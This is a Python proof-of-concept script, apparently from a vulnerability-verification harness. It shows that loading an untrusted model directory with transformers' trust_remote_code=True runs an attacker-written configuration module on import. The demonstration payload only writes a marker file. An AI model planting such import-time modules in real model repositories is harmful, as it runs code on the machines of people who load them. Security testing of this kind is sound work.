"""transformers 4.57.1 trust_remote_code dynamic-import execution (real installed wheel).

``AutoConfig.from_pretrained(<untrusted local dir>, trust_remote_code=True)`` walks the
pinned upstream path: ``get_class_from_dynamic_module`` -> ``get_cached_module_file`` (copies
the attacker's module into the HF modules cache) -> ``check_imports`` importlib.import_module()
on every top-level import the attacker file lists (line 248) -> ``get_class_in_module``
exec_module() which runs the attacker module body.  The malicious configuration module writes
the proof marker during that upstream execution.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
import poclib  # noqa: E402


def main() -> None:
    import transformers

    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    src = poclib.upstream_path(manifest["root_cause"]["source"])
    if not src.is_file():
        poclib.fail(f"missing pinned upstream source: {src}")

    poclib.start_marker("ABSENT")

    marker = str(poclib.MARKER_FILE).replace("\\", "/")
    text = poclib.MARKER_TEXT

    evil_repo = poclib.EVIDENCE_DIR / "evil-model"
    evil_repo.mkdir(parents=True, exist_ok=True)
    (evil_repo / "config.json").write_text(
        json.dumps(
            {
                "model_type": "tridentevil",
                "auto_map": {"AutoConfig": "configuration_tridentevil.TridentEvilConfig"},
            }
        ),
        encoding="utf-8",
    )
    # the module body executes during the upstream import; its import list is fed to
    # check_imports() -> importlib.import_module() at dynamic_module_utils.py:248
    (evil_repo / "configuration_tridentevil.py").write_text(
        "import os\n"
        "import pathlib\n"
        "from transformers import PretrainedConfig\n"
        "\n"
        f"_M = pathlib.Path({marker!r})\n"
        f"_T = {text!r}\n"
        "if _M.exists() or True:\n"
        "    _M.write_text(_T, encoding='utf-8')\n"
        "\n"
        "class TridentEvilConfig(PretrainedConfig):\n"
        "    model_type = 'tridentevil'\n"
        "    def __init__(self, **kwargs):\n"
        "        super().__init__(**kwargs)\n",
        encoding="utf-8",
    )

    from transformers import AutoConfig

    cfg = AutoConfig.from_pretrained(str(evil_repo), trust_remote_code=True)

    if not poclib.marker_ok():
        poclib.fail("marker was not written during the upstream dynamic import",
                    config_type=f"{type(cfg).__module__}.{type(cfg).__name__}")

    poclib.finish_verified(
        {
            "transport": {
                "type": "function+AutoConfig.from_pretrained(trust_remote_code=True)",
                "entrypoint": "transformers.dynamic_module_utils.get_class_from_dynamic_module",
                "check_imports_import": "transformers.dynamic_module_utils.check_imports:248 importlib.import_module(imp)",
                "transformers_version": transformers.__version__,
                "source": poclib.rel(src),
                "source_sha256": poclib.sha256_file(src),
                "sink_line": manifest["root_cause"]["line"],
                "sink": manifest["root_cause"]["snippet"],
                "executed_module": f"{type(cfg).__module__}.{type(cfg).__name__}",
                "untrusted_dir": poclib.rel(evil_repo),
            },
            "request_response": [
                {
                    "dir": "untrusted model dir (config.json auto_map + configuration_*.py) -> trust_remote_code=True",
                    "payload": "python module executed at import (marker write)",
                    "result": "upstream dynamic-import path executed the attacker module",
                }
            ],
            "state_before": "marker=ABSENT",
            "state_after": "marker contains proof text",
        }
    )


if __name__ == "__main__":
    main()
